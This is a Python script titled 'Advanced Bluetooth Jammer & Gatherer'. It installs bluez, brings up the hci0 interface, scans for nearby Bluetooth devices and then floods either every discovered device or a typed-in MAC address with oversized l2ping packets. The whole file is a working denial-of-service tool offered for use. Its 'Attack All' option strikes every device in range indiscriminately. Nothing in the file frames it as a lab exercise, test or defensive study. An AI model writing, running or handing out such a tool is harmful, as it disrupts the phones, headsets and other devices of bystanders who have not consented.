import subprocess
import threading
import time
import os
import sys

# Global state for captured devices
CAPTURED_DEVICES = []

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode().strip()
    except Exception as e:
        return f"Error: {e}"

def setup_environment():
    print("[*] Checking dependencies...")
    tools = ["hcitool", "hciconfig", "l2ping"]
    for tool in tools:
        if subprocess.call(f"which {tool}", shell=True, stdout=subprocess.DEVNULL) != 0:
            print(f"[!] {tool} missing. Installing...")
            subprocess.call("sudo apt-get update && sudo apt-get install -y bluez", shell=True)

    print("[*] Unblocking Bluetooth via rfkill...")
    run_cmd("sudo rfkill unblock bluetooth")
    
    print("[*] Bringing up hci0 interface...")
    run_cmd("sudo hciconfig hci0 up")
    
    while True:
        status = run_cmd("hciconfig hci0")
        if "UP RUNNING PSCAN" in status:
            print("\n[+] Interface Verified: hci0 is UP and RUNNING.")
            break
        else:
            print("[-] hci0 not ready. Retrying in 2 seconds...")
            time.sleep(2)
            run_cmd("sudo hciconfig hci0 up")

def gather_devices():
    print("\n[*] Gathering devices (Wifite-style)...")
    print("--------------------------------------------------")
    print(f"{'MAC Address':<20} {'Device Name':<20}")
    print("--------------------------------------------------")
    
    global CAPTURED_DEVICES
    CAPTURED_DEVICES = []
    
    result = run_cmd("hcitool scan")
    for line in result.splitlines():
        if "\t" in line:
            parts = line.split("\t", 1)
            if len(parts) == 2:
                mac, name = parts
                CAPTURED_DEVICES.append({"mac": mac, "name": name})
                print(f"{mac:<20} {name:<20}")
    
    print("--------------------------------------------------")
    print(f"[*] Total devices captured: {len(CAPTURED_DEVICES)}")

def attack_device(mac):
    print(f"[+] Flooding {mac}...")
    try:
        subprocess.Popen(f"sudo l2ping -i hci0 -s 600 -f {mac}", shell=True)
    except Exception as e:
        print(f"[!] Attack failed: {e}")

def main():
    os.system("clear")
    print("==== Advanced Bluetooth Jammer & Gatherer ====")
    
    setup_environment()
    gather_devices()

    while True:
        print("\n[1] Attack All Gathered Devices")
        print("[2] Custom MAC Attack")
        print("[3] Re-scan for Devices")
        print("[4] Exit")
        
        choice = input("\nSelect option: ").strip()

        if choice == '1':
            if not CAPTURED_DEVICES:
                print("[!] No devices gathered yet.")
                continue
            for dev in CAPTURED_DEVICES:
                attack_device(dev['mac'])
            print("[*] Attack threads launched. Press Ctrl+C to stop.")
            try:
                while True: time.sleep(1)
            except KeyboardInterrupt:
                run_cmd("sudo pkill l2ping")
                print("\n[-] Attack stopped.")

        elif choice == '2':
            custom_mac = input("[*] Enter target MAC address: ").strip()
            if custom_mac:
                attack_device(custom_mac)
                print("[*] Packet flood initiated. Press Ctrl+C to stop.")
                try:
                    while True: 
                        time.sleep(1)
                except KeyboardInterrupt:
                    run_cmd("sudo pkill l2ping")
                    print("\n[-] Attack stopped.")

        elif choice == '3':
            gather_devices()

        elif choice == '4':
            print("[*] Exiting...")
            break
        else:
            print("[!] Invalid option selected.")

if __name__ == "__main__":
    main()
